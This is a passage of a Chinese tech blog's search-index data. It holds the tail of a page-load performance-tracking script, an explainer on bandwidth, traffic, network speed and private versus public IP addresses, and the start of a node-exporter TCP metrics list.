return currentScript.getAttribute(\"data-tracking-code\"); } catch (error) { console.error(error); console.log('请在引入该脚本的script标签上添加id=\"performance-check-script\"属性'); return null; } } // 采集数据推送 async function sendPerformanceData(data) { if (!data.tracking_code) { if (enableLog) console.log(\"No tracking code provided. Skipping performance data collection.\"); return; } if (enableLog) console.log(\"Sending performance data:\", data); const postOptions = { method: \"POST\", headers: { \"Content-Type\": \"application/json\" }, body: JSON.stringify(data) }; try { const response = await fetch(apiUrl, postOptions); if (response.ok) { const result = await response.json(); if (enableLog) console.log(\"Performance data sent successfully:\", result); } else { if (enableLog) console.error(`Request failed with status: ${response.status}`); } } catch (error) { if (enableLog) console.error(\"Error sending performance data:\", error); } } // 收集性能数据的主函数 async function collectPerformanceData() { const trackingCode = getTrackingCode(); if (!trackingCode) { if (enableLog) console.log(\"No tracking code provided. Skipping performance data collection.\"); return; } let performanceData; if (window.PerformanceNavigationTiming) { const entry = performance.getEntriesByType(\"navigation\")[0]; performanceData = extractPerformanceDataFromNavigationEntry(entry); } else { performanceData = extractPerformanceDataFromTimingAPI(); } performanceData.tracking_code = trackingCode; performanceData.request_uri = window.location.pathname; performanceData.tracking_domain = window.location.hostname; await sendPerformanceData(performanceData); } function extractPerformanceDataFromNavigationEntry(entry) { return { frontend_performance: entry.duration, dns_time: entry.domainLookupEnd - entry.domainLookupStart, redirect_time: entry.redirectEnd - entry.redirectStart, dom_load_time: entry.domContentLoadedEventEnd - entry.domContentLoadedEventStart, ttfb_time: entry.responseStart - entry.requestStart, content_load_time: entry.loadEventStart - entry.responseEnd, onload_callback_time: entry.loadEventEnd - entry.loadEventStart, dns_cache_time: entry.domainLookupStart, unload_time: entry.unloadEventEnd - entry.unloadEventStart, tcp_handshake_time: entry.connectEnd - entry.connectStart }; } function extractPerformanceDataFromTimingAPI() { const timing = performance.timing; return { frontend_performance: timing.loadEventEnd - timing.navigationStart, dns_time: timing.domainLookupEnd - timing.domainLookupStart, redirect_time: timing.redirectEnd - timing.redirectStart, dom_load_time: timing.domContentLoadedEventEnd - timing.domContentLoadedEventStart, ttfb_time: timing.responseStart - timing.requestStart, content_load_time: timing.loadEventStart - timing.responseEnd, onload_callback_time: timing.loadEventEnd - timing.loadEventStart, dns_cache_time: timing.domainLookupStart, unload_time: timing.unloadEventEnd - timing.unloadEventStart, tcp_handshake_time: timing.connectEnd - timing.connectStart }; } // 当脚本加载完成后立即执行 (function () { if (document.readyState === \"complete\") { setTimeout(collectPerformanceData, 0); } else { window.addEventListener(\"load\", function () { setTimeout(collectPerformanceData, 0); }); } })(); // 提供一个方法来控制日志打印 function setLogEnabled(enabled) { enableLog = enabled; } ","date":"2023-11-13","objectID":"/posts/scripts/javascript/%E9%A1%B5%E9%9D%A2%E5%8A%A0%E8%BD%BD%E6%97%B6%E9%97%B4%E7%BB%9F%E8%AE%A1/:1:0","tags":["linux","javascript","scripts"],"title":"页面加载时间统计","uri":"/posts/scripts/javascript/%E9%A1%B5%E9%9D%A2%E5%8A%A0%E8%BD%BD%E6%97%B6%E9%97%B4%E7%BB%9F%E8%AE%A1/"},{"categories":["linux","整理收集"],"content":"内网.外网.宽带.带宽.流量.网速之间的区别与联系","date":"2023-11-03","objectID":"/posts/linux/%E5%86%85%E7%BD%91.%E5%A4%96%E7%BD%91.%E5%AE%BD%E5%B8%A6.%E5%B8%A6%E5%AE%BD.%E6%B5%81%E9%87%8F.%E7%BD%91%E9%80%9F%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E8%81%94%E7%B3%BB/","tags":["linux","解决方案"],"title":"内网.外网.宽带.带宽.流量.网速之间的区别与联系","uri":"/posts/linux/%E5%86%85%E7%BD%91.%E5%A4%96%E7%BD%91.%E5%AE%BD%E5%B8%A6.%E5%B8%A6%E5%AE%BD.%E6%B5%81%E9%87%8F.%E7%BD%91%E9%80%9F%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E8%81%94%E7%B3%BB/"},{"categories":["linux","整理收集"],"content":"带宽与宽带的区别是什么 带宽是量词，指的是网速的大小，比如1Mbps的意思是一兆比特每秒，这个数值就是指带宽。 宽带是名词，说明网络的传输速率速很高 。宽带的标准各不相同，最初认为128kbps以上带宽的就是宽带，而以下的就是窄带。 但现在国内运营商一般提供至少512kbps带宽的宽带服务。也就是说，带宽是一个具体数值，而宽带则是满足一定带宽数值的一种传输标准(服务)。 即：宽带是一种业务，带宽是传输速度。 宽带：在数字通信中通常指64kbit/s以上信号的带宽。 窄带：在数字通信中通常指64kbit/s以下信号的带宽。 ","date":"2023-11-03","objectID":"/posts/linux/%E5%86%85%E7%BD%91.%E5%A4%96%E7%BD%91.%E5%AE%BD%E5%B8%A6.%E5%B8%A6%E5%AE%BD.%E6%B5%81%E9%87%8F.%E7%BD%91%E9%80%9F%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E8%81%94%E7%B3%BB/:1:0","tags":["linux","解决方案"],"title":"内网.外网.宽带.带宽.流量.网速之间的区别与联系","uri":"/posts/linux/%E5%86%85%E7%BD%91.%E5%A4%96%E7%BD%91.%E5%AE%BD%E5%B8%A6.%E5%B8%A6%E5%AE%BD.%E6%B5%81%E9%87%8F.%E7%BD%91%E9%80%9F%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E8%81%94%E7%B3%BB/"},{"categories":["linux","整理收集"],"content":"宽带 通常别人会说你家能不能上网？其实这个意思就是你家有没有宽带，换句话说，就是一个名词，先有了宽带一词，然后才可以说你带宽是多少，宽带与上网的速度快慢没有直接关系。 ","date":"2023-11-03","objectID":"/posts/linux/%E5%86%85%E7%BD%91.%E5%A4%96%E7%BD%91.%E5%AE%BD%E5%B8%A6.%E5%B8%A6%E5%AE%BD.%E6%B5%81%E9%87%8F.%E7%BD%91%E9%80%9F%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E8%81%94%E7%B3%BB/:2:0","tags":["linux","解决方案"],"title":"内网.外网.宽带.带宽.流量.网速之间的区别与联系","uri":"/posts/linux/%E5%86%85%E7%BD%91.%E5%A4%96%E7%BD%91.%E5%AE%BD%E5%B8%A6.%E5%B8%A6%E5%AE%BD.%E6%B5%81%E9%87%8F.%E7%BD%91%E9%80%9F%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E8%81%94%E7%B3%BB/"},{"categories":["linux","整理收集"],"content":"带宽 当我们想申请宽带了，需要到一些服务提供商那里注册登记，这时会根据套餐的不同，你可能会有10Mb/s 、 20Mb/s等，可以计算机字节换算比例可以计算出自己的带宽大小 比如： 1B=8b //1字节=8位 1KB=1024B 1MB=1024KB 1GB=1024MB 我们申请的带宽是10Mb/s这个单位中的b是小写的，而我们刚才说的1B(字节)=8b(位),这里刚好是8倍的关系，即下载速度：10Mb / 8 = 1.25MB 有的人就会问，为什么要除以8? 在计算机中，下载速度是以字节(B)为单位的，而提供商说的是以比特(b)为单位的。 比如说: 在网上下载一个软件，都会以B(字节)为单位的，再比如你打开一个网页，这个网页中可能会有图片，文字，视频等内容，这些内容本质上来说，也是下载到你电脑了，然后你才能看到的 我们可以带宽来计算出自己的下载速度： 计算方式：带宽大小 / 8 带宽 下载速度 公式 带宽为2Mb 下载速度为256KB/s 2 / 8 = 0.25 带宽为4Mb 下载速度为512KB/s 4 / 8 = 0.5 带宽为8Mb 下载速度为1.00MB/s 8 / 8= 1.0 带宽为10Mb 下载速度为1.25MB/s 10 / 8 = 1.25 带宽为20Mb 下载速度为2.50MB/s 20 / 8 = 2.50 带宽为100Mb 下载速度为12.5MB/s 100 / 8 = 12.50 有的时候，使用一些软件测试网速时，发现与我们计算的结果有点差距，这个是正常现象，这是由于一些物理线路磨损等客观原因造成的。 还有的时候，大家在深夜下载软件时，会发现，下载速度超过了我们理论上计算出来的值，这种情况也是存在的, 我们可以这样理解: 比如你家在J区，那么提供商拉到J区的总线路是100Mb/s , 而你家申请的是10M,由于限制都是从路由器里设置的，这个与设置路由器的设置有关。 第二种情况就是，你下载软件的服务器比较闲，这样速度也是比较快的。 第三种情况就是我们下载软件时，可能会用迅雷呀这方面的软件，由于这个软件下载的人多了，那么他的速度也是比较快的。 通俗理解的话： 带宽就好比你的水龙头大小，网速就相好比从水龙头里出来的水流速有多快。 以上都是说下载速度，那么上传速度是怎么计算的呢，其实上传速度这个与地域的不同而不同，一般上传速度都被提供商限制了，这个说不准。 ","date":"2023-11-03","objectID":"/posts/linux/%E5%86%85%E7%BD%91.%E5%A4%96%E7%BD%91.%E5%AE%BD%E5%B8%A6.%E5%B8%A6%E5%AE%BD.%E6%B5%81%E9%87%8F.%E7%BD%91%E9%80%9F%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E8%81%94%E7%B3%BB/:3:0","tags":["linux","解决方案"],"title":"内网.外网.宽带.带宽.流量.网速之间的区别与联系","uri":"/posts/linux/%E5%86%85%E7%BD%91.%E5%A4%96%E7%BD%91.%E5%AE%BD%E5%B8%A6.%E5%B8%A6%E5%AE%BD.%E6%B5%81%E9%87%8F.%E7%BD%91%E9%80%9F%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E8%81%94%E7%B3%BB/"},{"categories":["linux","整理收集"],"content":"流量 流量是对外发送数据与接收数据包的大小总和，单位是采取1024进制的，单位有 B, KB, MB(M), GB(G) 1G=1024MB 1M=1024KB 1KB=1024字节(B） 一般我们手机有 5元30MB, 10元70MB的流量套餐，当我们打开一个网页，需要多少流量呢 假设某一个网页上有 100 个汉字与一张100KB的图片，一个汉字 = 2个字节 即这个页面的数据大小为：100 * 2B / 1024 + 100KB = 0.2KB +100KB = 100.2KB； 每访问一次这个页面，将产生100.2KB的流量，如果是70MB的流量，那么访问几个网页基本快没有了，所以更不要说看视频了。 ","date":"2023-11-03","objectID":"/posts/linux/%E5%86%85%E7%BD%91.%E5%A4%96%E7%BD%91.%E5%AE%BD%E5%B8%A6.%E5%B8%A6%E5%AE%BD.%E6%B5%81%E9%87%8F.%E7%BD%91%E9%80%9F%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E8%81%94%E7%B3%BB/:4:0","tags":["linux","解决方案"],"title":"内网.外网.宽带.带宽.流量.网速之间的区别与联系","uri":"/posts/linux/%E5%86%85%E7%BD%91.%E5%A4%96%E7%BD%91.%E5%AE%BD%E5%B8%A6.%E5%B8%A6%E5%AE%BD.%E6%B5%81%E9%87%8F.%E7%BD%91%E9%80%9F%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E8%81%94%E7%B3%BB/"},{"categories":["linux","整理收集"],"content":"带宽、网速和流量之间的关系 通常情况下：我们说的 我家的带宽10M 现在网速网速：200KB/s 看一张图片使用了8M的流量 那么带宽、网速、流量之间有什么关系，他们分别代表什么呢？ 带宽单位是：比特/秒（bps）：10M=10Mbps 网速是数据传输的速度，单位是：字节/秒 (B/s， KB/s， MB/s) 1MB/s = 1024KB/s 1KB/s = 1024B/s 流量是用户上网 发送和接收 的 数据量总和 ，单位是：字节（Byte) 比特是信息的最小单位：1字节 = 8比特 也就是1B = 8bit 或者 1B = 8b 1字节/秒 = 8比特/秒 (1B/s = 8bps) 1比特 (1b or 1位) 是信息技术中的最小存储单位，1 位代表一个“1”或者“0” 1B（1字节）是比较小的存储单位：一般情况下1个英文字母占1个字节；一个汉字占2个字节 他们之间的换算：带宽大小 / 8 10M带宽(10Mb/s)=1.25MB/s网速 1M带宽(1Mb/s)=0.125MB/s=128KB/s 10Mbps = 10*1024Kbps =10*1024*1024bps =10*1024*1024/8 Byte/s =10/8 MB/s =1.25 MB/s ","date":"2023-11-03","objectID":"/posts/linux/%E5%86%85%E7%BD%91.%E5%A4%96%E7%BD%91.%E5%AE%BD%E5%B8%A6.%E5%B8%A6%E5%AE%BD.%E6%B5%81%E9%87%8F.%E7%BD%91%E9%80%9F%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E8%81%94%E7%B3%BB/:5:0","tags":["linux","解决方案"],"title":"内网.外网.宽带.带宽.流量.网速之间的区别与联系","uri":"/posts/linux/%E5%86%85%E7%BD%91.%E5%A4%96%E7%BD%91.%E5%AE%BD%E5%B8%A6.%E5%B8%A6%E5%AE%BD.%E6%B5%81%E9%87%8F.%E7%BD%91%E9%80%9F%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E8%81%94%E7%B3%BB/"},{"categories":["linux","整理收集"],"content":"上行带宽和下行带宽是什么意思？各有什么作用？ ","date":"2023-11-03","objectID":"/posts/linux/%E5%86%85%E7%BD%91.%E5%A4%96%E7%BD%91.%E5%AE%BD%E5%B8%A6.%E5%B8%A6%E5%AE%BD.%E6%B5%81%E9%87%8F.%E7%BD%91%E9%80%9F%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E8%81%94%E7%B3%BB/:6:0","tags":["linux","解决方案"],"title":"内网.外网.宽带.带宽.流量.网速之间的区别与联系","uri":"/posts/linux/%E5%86%85%E7%BD%91.%E5%A4%96%E7%BD%91.%E5%AE%BD%E5%B8%A6.%E5%B8%A6%E5%AE%BD.%E6%B5%81%E9%87%8F.%E7%BD%91%E9%80%9F%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E8%81%94%E7%B3%BB/"},{"categories":["linux","整理收集"],"content":"上行带宽和下行带宽，或者说上行速度和下行速度是什么意思? 在设置路由器的限速，或者配置其它一些软件的时会遇到上行速度和下行速度的配置，很多用户根本就不知道这两个所代表的意思，下面会对这两种进行详细讲解： 在访问互联网时存在两种行为：一是上传数据，二是下载数据。上行宽带(速度) 指的是上传的速度，而下行宽带(速度) 指的是下载数据时的数度。 在详细一点可以理解为 ","date":"2023-11-03","objectID":"/posts/linux/%E5%86%85%E7%BD%91.%E5%A4%96%E7%BD%91.%E5%AE%BD%E5%B8%A6.%E5%B8%A6%E5%AE%BD.%E6%B5%81%E9%87%8F.%E7%BD%91%E9%80%9F%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E8%81%94%E7%B3%BB/:7:0","tags":["linux","解决方案"],"title":"内网.外网.宽带.带宽.流量.网速之间的区别与联系","uri":"/posts/linux/%E5%86%85%E7%BD%91.%E5%A4%96%E7%BD%91.%E5%AE%BD%E5%B8%A6.%E5%B8%A6%E5%AE%BD.%E6%B5%81%E9%87%8F.%E7%BD%91%E9%80%9F%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E8%81%94%E7%B3%BB/"},{"categories":["linux","整理收集"],"content":"上行带宽即上行速率 一般是指从你的电脑上传的速度，别人对你的电脑进行通讯的速率。比如你往QQ空间上传你的相片，这个时候上传相片的速度就是上行速度，其他还有比如你往一些云盘里面上传文件的时候，这个时候的速度也是上行速率，我们可能会发现，通常情况下，上传文件的速度比我们平常使用的网络速度要慢很多。 ","date":"2023-11-03","objectID":"/posts/linux/%E5%86%85%E7%BD%91.%E5%A4%96%E7%BD%91.%E5%AE%BD%E5%B8%A6.%E5%B8%A6%E5%AE%BD.%E6%B5%81%E9%87%8F.%E7%BD%91%E9%80%9F%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E8%81%94%E7%B3%BB/:7:1","tags":["linux","解决方案"],"title":"内网.外网.宽带.带宽.流量.网速之间的区别与联系","uri":"/posts/linux/%E5%86%85%E7%BD%91.%E5%A4%96%E7%BD%91.%E5%AE%BD%E5%B8%A6.%E5%B8%A6%E5%AE%BD.%E6%B5%81%E9%87%8F.%E7%BD%91%E9%80%9F%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E8%81%94%E7%B3%BB/"},{"categories":["linux","整理收集"],"content":"下行带宽即下行速率 一般是你从网络上的主机下载的速度，比如你下载文件的速度，打开网页的速度，这种速度就是下行速率，下行速率通常就是我们平常所说的网速，比如你的带宽是电信8M,光纤20M等，这种速度其实就是指的网络的下行速率。 上行宽带(速度)和下行宽带(速度)是不对称的。 一般是下行速度大于上行的速度。我们平时所使用的宽带说多少M，都是指的下行宽带，因为我们上网主要是从互联网上下载数据，而上传的数据量要少很多。 为什么在使用宽带的过程中，发现电脑下载的速度根本就达不到自己办理的宽带的标准，例如10Mb/s的宽带，下载速度只有1MB/s左右的速度，这是为什么呢? 因为宽带运营商的带宽下行速度和Windows电脑上的下行速度的单位不一样 ，Windows电脑的单位是KBbs/s,而宽带运营上的单位是Kbbs/s，1B=8b(1字节=8位)。 假设你办理了10M的宽带，10Mbps=10240Kbps/8=1280KBps,所以在你电脑的最大的下载速度只有1280KBps，也就是大概1.25MB/s左右的样子。所以不要再说宽带公司坑人，办理的宽带扣量了，这只不过是计算的单位不同引起的。 宽带的下载速率除宽带带宽外，与计算机配置、使用的下载软件，下载的大小、下载网站的速率等均有关系，一般的下载软件都可以查看的宽带下载速率(如迅雷)。 理想的状态下：100M光纤宽带的下行宽带在10M/S-11M/s之间；上行宽带是指上传到互联网上的速度；这个要开你开通的宽带是上下行等同还是不等同了；不知道的可以咨询你的运营商；如果是等同的你的上行宽带也是10M/S - 11M/s之间；不是等同的一般上行宽带只有400kbs/s-500Kbs/s。 注：一般企业开通的是上下行带宽等同的；家用的是不等同，一般只管下行带宽，上行的不管的。 ","date":"2023-11-03","objectID":"/posts/linux/%E5%86%85%E7%BD%91.%E5%A4%96%E7%BD%91.%E5%AE%BD%E5%B8%A6.%E5%B8%A6%E5%AE%BD.%E6%B5%81%E9%87%8F.%E7%BD%91%E9%80%9F%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E8%81%94%E7%B3%BB/:7:2","tags":["linux","解决方案"],"title":"内网.外网.宽带.带宽.流量.网速之间的区别与联系","uri":"/posts/linux/%E5%86%85%E7%BD%91.%E5%A4%96%E7%BD%91.%E5%AE%BD%E5%B8%A6.%E5%B8%A6%E5%AE%BD.%E6%B5%81%E9%87%8F.%E7%BD%91%E9%80%9F%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E8%81%94%E7%B3%BB/"},{"categories":["linux","整理收集"],"content":"服务器的上行和下行带宽理解 对服务器而言， 客户端下载资源消耗的是服务器的上行流量，客户端上传资源消耗的是服务器的下行流量， 通常买的服务器，比如阿里云，一般买的带宽指的是上行带宽，下行通常是不限的。而且流量的计算一般都是以上行的来计算的。 所以，客户端上传资源，对服务器的带宽基本没有影响，因为服务器的下行基本不限的，跟客户端本身网络的带宽有影响； 而客户端下载资源，除了跟服务器的带宽有影响，跟客户端本身的网络带宽也有影响的。 ","date":"2023-11-03","objectID":"/posts/linux/%E5%86%85%E7%BD%91.%E5%A4%96%E7%BD%91.%E5%AE%BD%E5%B8%A6.%E5%B8%A6%E5%AE%BD.%E6%B5%81%E9%87%8F.%E7%BD%91%E9%80%9F%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E8%81%94%E7%B3%BB/:8:0","tags":["linux","解决方案"],"title":"内网.外网.宽带.带宽.流量.网速之间的区别与联系","uri":"/posts/linux/%E5%86%85%E7%BD%91.%E5%A4%96%E7%BD%91.%E5%AE%BD%E5%B8%A6.%E5%B8%A6%E5%AE%BD.%E6%B5%81%E9%87%8F.%E7%BD%91%E9%80%9F%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E8%81%94%E7%B3%BB/"},{"categories":["linux","整理收集"],"content":"服务器的上行带宽 服务器的上行带宽主要用于本地用户请求服务器上的资源(每秒钟服务器传给客户端的最大数据量,服务器流出的带宽)（即本地的下载、服务器的上传）`,如果是在其他机器下载服务器上的文件，用的主要是服务器的上行带宽。 这里一定要分清楚上行带宽和下行带宽是对谁而言的，个人PC下载速度看的是自己的下行带宽和服务器的上行带宽 个人PC（A）与服务器（B）连接，服务器B的最大上行带宽（上行速度）决定了PC最大下载速度 ","date":"2023-11-03","objectID":"/posts/linux/%E5%86%85%E7%BD%91.%E5%A4%96%E7%BD%91.%E5%AE%BD%E5%B8%A6.%E5%B8%A6%E5%AE%BD.%E6%B5%81%E9%87%8F.%E7%BD%91%E9%80%9F%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E8%81%94%E7%B3%BB/:8:1","tags":["linux","解决方案"],"title":"内网.外网.宽带.带宽.流量.网速之间的区别与联系","uri":"/posts/linux/%E5%86%85%E7%BD%91.%E5%A4%96%E7%BD%91.%E5%AE%BD%E5%B8%A6.%E5%B8%A6%E5%AE%BD.%E6%B5%81%E9%87%8F.%E7%BD%91%E9%80%9F%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E8%81%94%E7%B3%BB/"},{"categories":["linux","整理收集"],"content":"服务器的下行带宽 下行带宽主要用于本地用户上传文件至服务器(客户上传数据到服务器),对于服务器来说，下行带宽是不限制的，网络因素，取决于客户端当前的网络情况 ","date":"2023-11-03","objectID":"/posts/linux/%E5%86%85%E7%BD%91.%E5%A4%96%E7%BD%91.%E5%AE%BD%E5%B8%A6.%E5%B8%A6%E5%AE%BD.%E6%B5%81%E9%87%8F.%E7%BD%91%E9%80%9F%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E8%81%94%E7%B3%BB/:8:2","tags":["linux","解决方案"],"title":"内网.外网.宽带.带宽.流量.网速之间的区别与联系","uri":"/posts/linux/%E5%86%85%E7%BD%91.%E5%A4%96%E7%BD%91.%E5%AE%BD%E5%B8%A6.%E5%B8%A6%E5%AE%BD.%E6%B5%81%E9%87%8F.%E7%BD%91%E9%80%9F%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E8%81%94%E7%B3%BB/"},{"categories":["linux","整理收集"],"content":"内网ip和外网ip区别 区别 如图，假设我们的计算机是设备一，想要访问百度。 如果使用校园网，首先需要先通过校园网的路由器把我们的内网ip转为校园网的外网ip。 然后通过这个外网ip先连接上湖南电信的网关，最后在连接上百度的网关。 百度把你请求的信息回传到你的校园网网关，校园网网关再把信息传给你（整个网络呈网状结构，它会自动找到一条通往百度的路径——基于深度优先搜索或者广度优先搜索）。 这个过程就跟淘宝购物差不多。 假设在学校里订购了一本书，淘宝那边接收到你的订单准备好物品就开始给你发货了。 他发现你的收货地址在湖南，于是它可能从杭州出发，先去了福建的中转站，然后再到江西的中转站，突然发现江西到湖南的中转站不通，于是它只能再绕到广东的中转站，最后再到湖南中转站。这些中转站就相当于公网上的各个网关。 到了湖南中转站，快递小哥再把包裹送到你的校门（这就是最后一级网关）。 这时快递小哥就走了，校门处的管理人员在根据的你的宿舍信息把包裹拿给你。（局域网内部的信息交流由校园网这个网关来处理） 这对刚接触互联网的人来说有些难以理解内网ip和公网ip的区别，那我们在举一个例子 我们把酒店的201房比作内网ip，那么凡是酒店都可能有201房，假如你饿了会对服务员说：“我在201房间，麻烦送些吃的过来“。而假如你要点外卖的话你对店家仅说送来201房间（内网ip），外面的人是不可能知道的，这时你就要对店家说某某市某某区某某酒店（公网ip)再加上201房 店家才能找到你。 -运营商所分配公网ip地址（某某市某某区某某酒店）也就是所住的酒店，而201房（内网ip） 则是酒店管家（路由器）所分配的。所以一个酒店可以有很多的房间（内网ip）但是当外面的朋友问你住哪里，你肯定不会说你住在201房间（内网ip）而会说你住在某某市某某区某某酒店（公网ip)。 这是内网ip和公网ip的本质区别。一个对内，一个对外 注意点 公网ip具有世界范围的唯一性，而内网ip只在局域网内部具有唯一性 一个局域网里所有电脑的内网IP是互不相同的,但共用一个外网IP。 就像前面酒店的例子一样：你所在学校的校名在整个世界上只有一个，但是你学校里面的A栋大楼3层3号教室只有在你的校园内部才具有唯一性。别的学校也有A栋大楼3层3号教室。你只能跟快递小哥说请帮我把包裹送到xx大学，而不能说请帮我把包裹送到A栋大楼3层3号教室。 在局域网中，每台电脑都可以自己分配自己的IP，但是这个IP只在局域网中有效。而如果你将电脑连接到互联网，你的网络提供商的服务器会为你分配一个IP地址，这个IP地址才是你在外网的IP。两个IP同时存在，一个对内，一个对外。 互联网上的IP（即外网IP）地址统一由一个叫“IANA(互联网网络号分配机构)”的组织来管理。由于分配不合理以及IPv4协议本身存在的局限，现在互联网的IP地址资源越来越紧张。IANA将A、B、C类IP地址的一部分保留下来，留作局域网使用。具体如下 IP地址空间(私有)： A类地址范围：10.0.0.0—10.255.255.255，即10.0.0.0/8 B类地址范围：172.16.0.0---172.31.255.555，即172.16.0.0/12 C类地址范围：192.168.0.0---192.168.255.255，即192.168.0.0/16 也就是说，如果你查到的ip地址在以上A、B、C类IP地址的范围内，它一定就是局域网的ip地址，否则就是公网的地址。 实际生活中不仅有一级NET技术，还有二级NET技术。也就是可能你的校园网关也只是个局域网。通过多级转换可以得到更多的地址。 ","date":"2023-11-03","objectID":"/posts/linux/%E5%86%85%E7%BD%91.%E5%A4%96%E7%BD%91.%E5%AE%BD%E5%B8%A6.%E5%B8%A6%E5%AE%BD.%E6%B5%81%E9%87%8F.%E7%BD%91%E9%80%9F%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E8%81%94%E7%B3%BB/:9:0","tags":["linux","解决方案"],"title":"内网.外网.宽带.带宽.流量.网速之间的区别与联系","uri":"/posts/linux/%E5%86%85%E7%BD%91.%E5%A4%96%E7%BD%91.%E5%AE%BD%E5%B8%A6.%E5%B8%A6%E5%AE%BD.%E6%B5%81%E9%87%8F.%E7%BD%91%E9%80%9F%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E8%81%94%E7%B3%BB/"},{"categories":["linux","整理收集"],"content":"经验法 一般电信ADSL带宽在未升级大带宽前是（动态）公网IP。如果花费很少的钱给你升级为100M光纤上网，99.99%是内网IP，那0.01%是我还没有发现过案例。 代理网络运营商99.99%都是内网IP，如长城带宽、聚友E家等。 光纤上网的99.99%都是内网IP。 ","date":"2023-11-03","objectID":"/posts/linux/%E5%86%85%E7%BD%91.%E5%A4%96%E7%BD%91.%E5%AE%BD%E5%B8%A6.%E5%B8%A6%E5%AE%BD.%E6%B5%81%E9%87%8F.%E7%BD%91%E9%80%9F%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E8%81%94%E7%B3%BB/:10:0","tags":["linux","解决方案"],"title":"内网.外网.宽带.带宽.流量.网速之间的区别与联系","uri":"/posts/linux/%E5%86%85%E7%BD%91.%E5%A4%96%E7%BD%91.%E5%AE%BD%E5%B8%A6.%E5%B8%A6%E5%AE%BD.%E6%B5%81%E9%87%8F.%E7%BD%91%E9%80%9F%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E8%81%94%E7%B3%BB/"},{"categories":["linux","整理收集"],"content":"直观法 以下IP段的地址都是内网IP地址 10.0.0.0 到 10.255.255.255 172.16.0.0 到 172.31.255.255 192.168.0.0 到 192.168.255.255 ","date":"2023-11-03","objectID":"/posts/linux/%E5%86%85%E7%BD%91.%E5%A4%96%E7%BD%91.%E5%AE%BD%E5%B8%A6.%E5%B8%A6%E5%AE%BD.%E6%B5%81%E9%87%8F.%E7%BD%91%E9%80%9F%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E8%81%94%E7%B3%BB/:11:0","tags":["linux","解决方案"],"title":"内网.外网.宽带.带宽.流量.网速之间的区别与联系","uri":"/posts/linux/%E5%86%85%E7%BD%91.%E5%A4%96%E7%BD%91.%E5%AE%BD%E5%B8%A6.%E5%B8%A6%E5%AE%BD.%E6%B5%81%E9%87%8F.%E7%BD%91%E9%80%9F%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E8%81%94%E7%B3%BB/"},{"categories":["linux","运维记事","整理收集"],"content":"node-exporter 连接数相关指标","date":"2023-09-21","objectID":"/posts/linux/prometheus_%E8%BF%9E%E6%8E%A5%E6%95%B0%E7%9B%B8%E5%85%B3%E6%8C%87%E6%A0%87/","tags":["linux","监控","prometheus","node-exporter"],"title":"node-exporter 连接数相关指标","uri":"/posts/linux/prometheus_%E8%BF%9E%E6%8E%A5%E6%95%B0%E7%9B%B8%E5%85%B3%E6%8C%87%E6%A0%87/"},{"categories":["linux","运维记事","整理收集"],"content":" 以下为资料来源,由本站收集重新整理发布,仅用于个人收藏,转载请直接标注以下来源连接 node-export中连接数相关指标 ","date":"2023-09-21","objectID":"/posts/linux/prometheus_%E8%BF%9E%E6%8E%A5%E6%95%B0%E7%9B%B8%E5%85%B3%E6%8C%87%E6%A0%87/:0:0","tags":["linux","监控","prometheus","node-exporter"],"title":"node-exporter 连接数相关指标","uri":"/posts/linux/prometheus_%E8%BF%9E%E6%8E%A5%E6%95%B0%E7%9B%B8%E5%85%B3%E6%8C%87%E6%A0%87/"},{"categories":["linux","运维记事","整理收集"],"content":"TCP相关指标 名称 类型 单位 说明 node_netstat_Tcp_InErrs counter 报文数 TCP 接收的错误报文数 node_netstat_Tcp_InSegs counter 报文数 TCP 